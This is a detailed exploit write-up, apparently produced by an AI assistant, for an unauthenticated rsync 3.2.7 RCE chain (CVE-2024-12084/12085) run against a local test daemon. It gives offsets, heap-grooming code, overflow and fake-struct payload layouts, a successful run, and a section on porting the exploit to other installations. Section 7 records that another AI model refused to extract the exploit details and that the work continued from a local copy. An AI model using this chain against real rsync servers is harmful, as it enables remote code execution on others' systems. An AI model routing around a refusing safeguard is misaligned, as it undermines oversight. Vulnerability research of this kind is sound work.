# Rsync CVE-2024-12084 + CVE-2024-12085 — Unauthenticated RCE Writeup

Based on the Phrack 72 article "Desync the Planet" by Simon Scannell,
Pedro Gallegos, and Jasiel Spelman. This documents the full process of
getting the exploit chain working on our target system, including all
the debugging steps, dead ends, and system-specific adaptations.

---

## 0. Environment

| Component        | Detail |
|------------------|--------|
| Target binary    | rsync 3.2.7, compiled from upstream source |
| OS               | Ubuntu 22.04.3 LTS, kernel 6.8 |
| glibc            | 2.35-0ubuntu3.13 |
| OpenSSL          | 3.0.2 |
| Arch             | x86-64 |
| Protections      | Full ASLR, PIE, NX, Full RELRO, stack canaries |
| MAX_DIGEST_LEN   | 64 (SHA512_DIGEST_LENGTH) |
| SUM_LENGTH       | 16 (fixed in `struct sum_buf`) |
| Overflow window  | 64 - 16 = **48 bytes** per sum_buf entry |

The system rsync (`3.2.7-0ubuntu0.22.04.4`) has all CVEs backported.
We built upstream 3.2.7 from source to get a vulnerable binary at
`/tmp/rsync-3.2.7/rsync`.

### Building rsync 3.2.7

```bash
cd /tmp
wget https://download.samba.org/pub/rsync/src/rsync-3.2.7.tar.gz
tar xzf rsync-3.2.7.tar.gz
cd rsync-3.2.7
./configure --with-openssl --disable-xxhash  # or --enable-xxhash
make
```

### Daemon setup

```bash
mkdir -p /tmp/rsync_test_module
echo "hello world" > /tmp/rsync_test_module/foo.txt
echo "test data"   > /tmp/rsync_test_module/bar.txt

cat > /tmp/rsyncd_test.conf << 'EOF'
log file = /tmp/rsync_daemon.log
[files]
  path = /tmp/rsync_test_module
  read only = true
  use chroot = false
EOF

/tmp/rsync-3.2.7/rsync --daemon --config=/tmp/rsyncd_test.conf --port=12000
```

Confirm vulnerability via banner:
```
$ echo "" | nc 127.0.0.1 12000
@RSYNCD: 31.0 sha512 sha256 sha1 md5 md4
```

Protocol 31 + SHA512 in the auth list confirms MAX_DIGEST_LEN = 64.

### Key binary offsets

Extract with `nm`:
```bash
nm /tmp/rsync-3.2.7/rsync | grep -E " (T|B) (shell_exec|ctx_evp|set_compression)$"
```

For our build:
```
CHECK_COMPRESSION_OFFSET = 0x436f7   # set_compression+599 (leaked via info leak)
SHELL_EXEC_OFFSET        = 0x2b970   # shell_exec() — calls system(cmd)
CTX_EVP_OFFSET           = 0x9dc28   # global EVP_MD_CTX *ctx_evp in .bss
XFER_SUM_NNI_OFFSET      = 0x89310   # SHA1 entry in valid_checksums_items
```

These change with every recompilation. You MUST extract them for your
specific binary.

---

## 1. Vulnerability Overview

### CVE-2024-12085 — Info Leak (ASLR Bypass)

In `match.c:hash_search()`, a stack buffer `sum2[MAX_DIGEST_LEN]` (64 bytes)
is only partially written by the digest algorithm. The remaining bytes contain
**uninitialized stack data**. An attacker controls `s2length` (up to 64) and
uses the server's match/no-match response as a 1-byte-at-a-time oracle to
leak up to 56 bytes of stack contents.

With xxhash64 (8-byte digest), offset `sum2+8` on the Phrack target contained
a `.text` pointer — one round of leaking gives the full PIE base.

### CVE-2024-12084 — Heap Buffer Overflow

In `sender.c:receive_sums()`, the server reads `s2length` bytes into
`sum2[16]` — overflowing by up to 48 bytes per `sum_buf` entry. By
overflowing the last entry into an adjacent `sum_struct`, the attacker
corrupts `s->sums` (WHERE to write), `s->count` (how many entries), and
`s->s2length` (how many bytes per write), creating an arbitrary
write-what-where primitive.

---

## 2. Exploitation Strategy (Phrack "One-Shot" Approach)

### High-level flow

```
┌─────────────┐    ┌─────────────────┐    ┌──────────────────┐
│  Info Leak   │───>│  Heap Overflow   │───>│  RCE Trigger     │
│  (Phase 1)   │    │  (Phase 2)       │    │                  │
│              │    │                  │    │  sum_init()       │
│  Leak .text  │    │  Corrupt sums    │    │  → EVP_Digest... │
│  → PIE base  │    │  → write to .bss │    │  → freectx()     │
│              │    │  → plant fake    │    │  → shell_exec()  │
│              │    │    EVP structs   │    │  → system(cmd)   │
└─────────────┘    └─────────────────┘    └──────────────────┘
```

### Phase 2 detail: one-shot .bss write

After the info leak provides the binary base, Phase 2:

1. **Heap groom**: Exhaust tcache bins, create a hole via filter rules
   so `sum_buf[5]` and `sum_struct` are adjacent on the heap.

2. **Overflow**: Send `count=5` entries with `s2length=64`. Each entry
   overflows 48 bytes. The last entry corrupts `sum_struct`:
   - `s->count` = 6 (adds one extra iteration)
   - `s->sums` = `&ctx_evp - 222` (redirects array to .bss)
   - `s->s2length` = 289 (size of our payload)

3. **Extra entry**: The 6th iteration reads `sum1` (4B) and `sum2`
   (289B) directly to `&ctx_evp`, writing:

```
Offset  Content                              .bss global
──────  ─────────────────────────────────    ──────────────────
0x000   fake_ctx_addr (ctx_evp+8)            ctx_evp (overwritten)
0x008   ┌─ fake EVP_MD_CTX (72 bytes) ─┐
        │ +0x08: digest → fake EVP_MD  │    file_sum_evp_md
        │ +0x18: flags = 0x400         │    file_sum_nni (clobbered)
        │ +0x30: xfer_sum_nni (PRESERVED)    xfer_sum_nni ← CRITICAL
        │ +0x38: algctx → cmd string   │
        └──────────────────────────────┘
0x050   ┌─ fake EVP_MD (~184 bytes) ───┐
        │ +0xb0: freectx = shell_exec  │
        └──────────────────────────────┘
0x108   "touch /tmp/rce_proof.txt\0"         sumresidue etc
```

4. **Trigger**: After `receive_sums`, the server enters `match_sums` →
   `sum_init(xfer_sum_nni, seed)` → `EVP_DigestInit_ex(ctx_evp, ...)`.
   Inside OpenSSL:
   ```
   ctx->algctx != NULL  →  ctx->digest->freectx(ctx->algctx)
                        →  shell_exec(cmd_string)
                        →  system("touch /tmp/rce_proof.txt")
   ```

### Overflow byte layout (64 bytes from last sum2)

```
Byte  Offset    Content                  Target
────  ──────    ───────                  ──────
0-15  sum2      checksum data            sum_buf[4].sum2 (in-bounds)
16-17 padding   don't care               struct padding
18-25 chunk hdr 0x31 (48B|PREV_INUSE)    sum_struct chunk size field
26-33 flength   0                        sum_struct.flength
34-41 sums      &ctx_evp - 222           sum_struct.sums (redirect)
42-45 count     6 (original + 1)         sum_struct.count
46-49 blength   1337                     sum_struct.blength
50-53 remainder 0                        sum_struct.remainder
54-57 s2length  289 (payload size)       sum_struct.s2length
58-63 padding   don't care               past sum_struct
```

---

## 3. Bugs Found and Fixed During Development

This section documents every issue encountered, how it was diagnosed,
and the fix. This is the most valuable part for anyone porting the
exploit to a new target.

### Bug 1: Protocol desync — "File-list index 49"

**Symptom**: Server logs `File-list index 49 not in -1 - 2
(read_ndx_and_attrs) [sender]`.

**Root cause (initially suspected)**: Outbound multiplexing mismatch.
We initially set `out_multiplexed = False` thinking the server didn't
demux inbound data.

**Actual root cause**: The ndx=49 error came from `read_final_goodbye`
(the SECOND ndx read), not the first. The first ndx=1 was read
correctly. The issue was that the heap overflow wasn't working, so the
server processed the file normally and then tried to read the next ndx
from leftover data in the socket.

**How diagnosed**: GDB `break flist_for_ndx` with multiple continues:
```
call 1: ndx=1           ← from send_files (correct)
call 2: ndx=49          ← from read_final_goodbye (leftover data)
```

**Key finding**: For protocol >= 30, the rsync server UNCONDITIONALLY
sets `need_messages_from_generator = 1` in `compat.c:776`, which
enables inbound demultiplexing. The client MUST send multiplexed data
(`out_multiplexed = True`). We confirmed this with GDB:
```
(gdb) break recv_filter_list
(gdb) printf "need_msgs=%d in_multiplexed=%d\n", need_messages_from_generator, iobuf.in_multiplexed
need_msgs=1 in_multiplexed=1
```

### Bug 2: Heap grooming — extra chunk in the gap

**Symptom**: `ctx_evp` watchpoint never triggered. The overflow wasn't
reaching `sum_struct`.

**Root cause**: The Phrack PoC sends TWO filters:
```go
filter := "+ " + strings.Repeat("Z", count*sumBufStructSize - 1)  // 200B pattern
client.WriteRawInt(len(filter) + 1); client.WriteLine(filter)
filter = "+ a"                                                      // tiny pattern
client.WriteRawInt(len(filter) + 1); client.WriteLine(filter)
client.WriteRawInt(len(clr) + 1); client.WriteLine(clr)  // "!" clears all
```

On Debian 12 (glibc 2.36), `malloc(2)` for pattern "a" gives an 8-byte
entry that goes to a tiny tcache bin. On Ubuntu 22.04 (glibc 2.35),
`malloc(2)` gives a **32-byte chunk** — same bin as the filter_rule
struct (48B). This extra chunk lands between `sum_buf[]` and
`sum_struct`, creating a **56-byte gap** instead of 8.

**How diagnosed**: GDB breakpoint at `sender.c:98` (after allocations):
```
With 2 filters: s=0x590 sums=0x490 diff=56   ← TOO FAR
With 1 filter:  s=0x560 sums=0x490 diff=8    ← CORRECT
```

**Fix**: Send only ONE filter (the large one). The tcache state from
the defragmentation provides the right placement without the second
filter.

```python
# WRONG (glibc 2.35):
filt = '+ ' + 'Z' * 199; rc.write_raw_int(len(filt)+1); rc.write_line(filt)
filt2 = '+ a';            rc.write_raw_int(len(filt2)+1); rc.write_line(filt2)
rc.write_raw_int(2);      rc.write_line('!')

# CORRECT (glibc 2.35):
filt = '+ ' + 'Z' * 199; rc.write_raw_int(len(filt)+1); rc.write_line(filt)
rc.write_raw_int(2);      rc.write_line('!')
```

**Verification**: `malloc_usable_size` test:
```c
malloc( 2) -> usable=24  chunk_size=32   // same bin as 32B requests
malloc(32) -> usable=40  chunk_size=48   // sum_struct lands here
malloc(40) -> usable=40  chunk_size=48   // filter_rule lands here
```

### Bug 3: xfer_sum_nni clobbered — trigger path bypassed

**Symptom**: `ctx_evp` WAS correctly overwritten (GDB watchpoint
confirmed `ctx_evp = fake_ctx_addr`). But `shell_exec` breakpoint
never hit. Server crashed with `SIGABRT: free(): invalid pointer`.

**Root cause**: Our 289-byte payload writes contiguously from `&ctx_evp`
through `&ctx_evp + 288`, overwriting ALL globals in that range. The
critical global `xfer_sum_nni` at `ctx_evp + 0x30` was zeroed.

When `match_sums` calls `sum_init(xfer_sum_nni, seed)`, it receives
`nni = NULL`. sum_init handles NULL by calling `parse_csum_name(NULL,0)`
which internally calls `malloc()`. Since the heap was corrupted by our
overflow, this malloc triggers `free(): invalid pointer` → SIGABRT.
The EVP trigger path is never reached.

**How diagnosed**: GDB break on `sum_init`:
```
sum_init(nni=0x0, seed=1337)  ← xfer_sum_nni was zeroed!
```

Then mapping the .bss layout around ctx_evp:
```bash
nm rsync | awk '/09dc/ || /09dd/'
```
```
0x09dc28 B ctx_evp              +0x000  ← we write here
0x09dc38 B xfer_sum_evp_md      +0x010
0x09dc58 B xfer_sum_nni         +0x030  ← ZEROED by our payload!
0x09dc60 b prior_result.0       +0x038
```

**Fix**: Preserve `xfer_sum_nni` in the payload at offset 0x30:
```python
XFER_SUM_NNI_OFFSET = 0x89310   # SHA1 entry in valid_checksums_items
xfer_sum_nni = base + XFER_SUM_NNI_OFFSET
struct.pack_into('<Q', payload, 0x30, xfer_sum_nni)
```

The SHA1 NNI entry is at a fixed offset in the binary's `.data` section,
so we can compute its runtime address from the leaked base.

### Bug 4: Chunk metadata corruption

**Symptom (earlier)**: Server crash during `receive_sums` loop when
overflow bytes 18-25 were all zeros, corrupting the malloc chunk size
field between `sum_buf[]` and `sum_struct`.

**Fix**: Set bytes 18-25 to `0x31` (48-byte chunk | PREV_INUSE):
```python
struct.pack_into('<Q', overflow_payload, 18, 0x31)
```

This is the correct chunk size for `sum_struct` (`malloc(32)` → 48B
chunk on glibc 2.35).

---

## 4. Porting to Other Installations

### What changes between targets

| Item | Why it changes | How to find it |
|------|---------------|----------------|
| `SHELL_EXEC_OFFSET` | Different compiler/flags | `nm rsync \| grep shell_exec` |
| `CTX_EVP_OFFSET` | Different .bss layout | `nm rsync \| grep ctx_evp` |
| `CHECK_COMPRESSION_OFFSET` | Different .text layout | `nm rsync \| grep set_compression` then add 599 |
| `XFER_SUM_NNI_OFFSET` | Different .data layout | `nm rsync \| grep valid_checksums_items`, then GDB to find SHA1 entry |
| Heap grooming | Different glibc version | See below |
| OpenSSL struct offsets | Different OpenSSL version | Reverse-engineer EVP_MD_CTX/EVP_MD layouts |
| .bss neighbor globals | Different compiler | `nm rsync \| sort` near ctx_evp |

### Adapting heap grooming for a new glibc

The #1 portability issue is heap grooming. The exploit needs `sum_struct`
allocated immediately after `sum_buf[]` with only an 8-byte chunk header
between them.

**Step 1**: Check malloc chunk sizes:
```c
// Compile and run on target:
#include <stdio.h>
#include <stdlib.h>
#include <malloc.h>
int main() {
    for (int sz = 1; sz <= 48; sz++) {
        void *p = malloc(sz);
        printf("malloc(%2d) -> usable=%zu chunk=%zu\n",
               sz, malloc_usable_size(p), malloc_usable_size(p)+8);
        free(p);
    }
}
```

**Step 2**: Set breakpoint at `sender.c:98` and check the gap:
```
(gdb) break sender.c:98
(gdb) continue
(gdb) printf "s=%p sums=%p diff=%ld\n", s, s->sums, (long)s - ((long)s->sums + s->count*40)
```

If `diff = 8` → grooming is correct.
If `diff > 8` → extra chunks in the gap. Try:
  - Removing the second filter
  - Adjusting filter pattern sizes
  - Adding more filter rules to consume extra tcache entries

**Step 3**: Check which .bss globals the payload overwrites:
```bash
nm rsync | sort | awk -v base=$(nm rsync | grep ' B ctx_evp$' | cut -d' ' -f1) \
  '{ a=strtonum("0x"$1); b=strtonum("0x"base); if (a>=b && a<b+300) print }'
```

Any global between `ctx_evp` and `ctx_evp+289` that is read during the
trigger path must be preserved in the payload. On our target,
`xfer_sum_nni` at `+0x30` was the critical one.

### Adapting for different OpenSSL versions

The trigger relies on OpenSSL's `EVP_DigestInit_ex` calling
`ctx->digest->freectx(ctx->algctx)`. This cleanup path exists in
OpenSSL 3.x when reinitializing a context that already has an `algctx`.

For OpenSSL 1.1.x, the struct layout and cleanup path differ. You'll
need to reverse-engineer `EVP_DigestInit_ex` in the target's
`libcrypto.so` to find:
- The offset of `digest` in `EVP_MD_CTX`
- The offset of `algctx` in `EVP_MD_CTX`
- The offset of `freectx` in `EVP_MD`
- What conditions trigger the cleanup (flags, etc.)

### Adapting for non-SHA1 checksums

If the target server supports xxhash (most stock packages do), Phase 1
uses xxhash64 (8-byte digest) for a faster and more reliable info leak.
If only SHA1/MD5 are available, the info leak window starts at offset 20
instead of 8, requiring binary-specific analysis to locate a pointer
in that range.

Phase 2 uses SHA1 as the checksum for the overflow connection. The
`XFER_SUM_NNI_OFFSET` must point to whichever checksum entry is
negotiated. Use GDB to verify:
```
(gdb) break sender.c:98
(gdb) printf "xfer_sum_nni->name=%s offset=0x%lx\n", xfer_sum_nni->name, (long)xfer_sum_nni - base
```

---

## 5. Debugging Methodology

### Essential GDB techniques

**Attach to daemon with fork following**:
```bash
DPID=$(pgrep -x rsync)
gdb -q -p $DPID \
  -ex "set follow-fork-mode child" \
  -ex "set detach-on-fork off" \
  -ex "set pagination off"
```

Ensure `ptrace_scope` allows attaching:
```bash
echo 0 | sudo tee /proc/sys/kernel/yama/ptrace_scope
```

**Key breakpoints**:
```
break sender.c:98          # after sum_buf + sum_struct allocated
break shell_exec           # RCE trigger
watch *(long*)&ctx_evp     # detect ctx_evp overwrite
break sum_init             # check nni argument
break flist_for_ndx        # track ndx values
```

**Check heap layout**:
```
(gdb) break sender.c:98
(gdb) printf "s=%p sums=%p gap=%ld\n", s, s->sums, (long)s - ((long)s->sums + 200)
(gdb) x/16gx (char*)s->sums + 200 - 8
```

**Check .bss state after overflow**:
```
(gdb) watch *(long*)&ctx_evp
(gdb) continue
# When hit:
(gdb) x/40gx &ctx_evp
(gdb) printf "xfer_sum_nni=%p\n", xfer_sum_nni
```

### Daemon log messages and their meaning

| Log message | Meaning |
|------------|---------|
| `File-list index N not in -1 - M` | Server read ndx=N but file list only has M entries. Usually means overflow didn't work (leftover data read as next ndx). |
| `unexpected tag -N` | Client sent non-multiplexed data but server expects multiplexed, or vice versa. Check `out_multiplexed` setting. |
| `connection unexpectedly closed` | Normal when exploit closes connection after payload delivery. |
| No error, just `building file list` | Server likely crashed silently (SIGSEGV/SIGABRT in child). Check with GDB. |

### Wire capture technique

Wrap the socket to log all sends after protocol setup:
```python
class LogSocket:
    def __init__(self, sock):
        self._sock = sock
        self.log = []
    def sendall(self, data):
        self.log.append(bytes(data))
        return self._sock.sendall(data)
    def __getattr__(self, name):
        return getattr(self._sock, name)

rc.sock = LogSocket(rc.sock)
```

Parse MSG_DATA headers:
```python
raw_tag = struct.unpack('<I', data[:4])[0]
msg_tag = (raw_tag >> 24) - 7  # 0 = MSG_DATA
msg_len = raw_tag & 0xFFFFFF
```

---

## 6. Successful Exploit Run

```
$ python3 /tmp/test_phase2.py
daemon PID=3797045, base=0x6085e935a000

[*] Phase 2: heap overflow → RCE
    shell_exec = 0x6085e9385970
    ctx_evp    = 0x6085e93f7c28
    payload    = 289 bytes at &ctx_evp
    fake_ctx   = 0x6085e93f7c30 (+8)
    fake_evpmd = 0x6085e93f7c78 (+80)
    cmd_addr   = 0x6085e93f7d30 (+264)
    target ndx=1 file=bar.txt
    sending payload (289 bytes) to &ctx_evp...
    overflow complete, consuming server output...
    server connection ended: connection closed
[+] Payload delivered — check if command executed.

*** RCE SUCCEEDED! ***
```

```
$ cat /tmp/rce_proof2.txt
uid=1000(x) gid=1000(x) groups=1000(x),4(adm),24(cdrom),...
```

---

## 7. User Prompts That Guided This Work

Every user prompt from the session, in chronological order. These shaped
every major pivot in the development process.

1. *Initial request* — Asked to exploit rsync CVE-2024-12084 (heap
   overflow) + CVE-2024-12085 (info leak) into a full RCE chain against
   rsync 3.2.7 daemon, following the Phrack 72 "Desync the Planet"
   article.

2. **"why are you modifying the rsync source?"** — I had been adding
   `fprintf` debug statements to sender.c and recompiling. The user
   correctly pointed out this shifts binary offsets (ctx_evp, shell_exec,
   etc.) and invalidates the exploit constants.

3. **"you should be using gdb .."** — Redirected from printf-debugging
   to GDB. Led to the attach-to-daemon workflow with
   `set follow-fork-mode child` that proved essential for every
   subsequent debugging step.

4. **"what sandbox"** — I had confused /tmp file isolation with
   sandboxing. Clarified the environment.

5. **"if you need root the password is x ?"** — Provided root credentials
   to fix `ptrace_scope` (was set to 1, blocking GDB attach). We ran
   `echo 0 > /proc/sys/kernel/yama/ptrace_scope`.

6. **"are you following the phrack exploitation? it outlines it pretty
   clear"** — Critical redirect. I had been inventing a multi-entry
   layout trying to align 40-byte sum_buf strides with 48-byte EVP_MD_CTX
   field offsets. The Phrack one-shot contiguous write approach is far
   simpler and more reliable.

7. **"read the phrack exploit - they use the info leak + heap overflow
   to get a reliable exploit."** — Prompted me to actually read the
   full Phrack article rather than working from partial understanding.

8. **"the writeup is in /tmp/rsync.txt"** — Pointed to the local copy of
   the Phrack article. Saved time vs trying to web-fetch it (the
   WebFetch AI model refused to extract exploit details).

9. **"if you need to setup a qemu with the exact debian + rsync used
   that is fine"** — Offered to set up the exact Debian 12 target
   environment. We didn't end up needing this because we adapted the
   exploit to our Ubuntu 22.04 system, but this would be the fastest
   path for exact reproduction of the Phrack PoC.

10. **"perfect it seems to work!! can you document your whole process +
    my prompts in a writeup! include how to get it working on other
    installations etc and debugging instructions."** — Led to this
    writeup document.

11. **"now that you have a good grasp of this vulnerability and
    exploitation can you audit the latest rsync for variants that may
    allow exploitation"** — Led to the security audit of rsync 3.4.1
    documented in the appendix.

12. **"the WRITEUP didnt include all of my prompts"** — This correction,
    leading to this expanded prompt section.

---

## 8. File Inventory

| File | Description |
|------|-------------|
| `exploit.py` | Combined Phase 1 (info leak) + Phase 2 (heap overflow → RCE) |
| `rsync_lib.py` | Python rsync protocol library |
| `writeup.md` | This document |

### Prerequisites

```bash
pip install xxhash          # needed for Phase 1 info leak
make                        # builds libfnamecmp.so for file list sorting
```

## 9. References

- Phrack 72, Article 11: "Desync the Planet - Rsync RCE" by Simon
  Scannell, Pedro Gallegos, Jasiel Spelman
  (https://phrack.org/issues/72/11_md)
- CVE-2024-12084: Heap Buffer Overflow in Checksum Parsing
- CVE-2024-12085: Info Leak via Uninitialized Stack Value
- rsync 3.2.7 source: https://download.samba.org/pub/rsync/src/
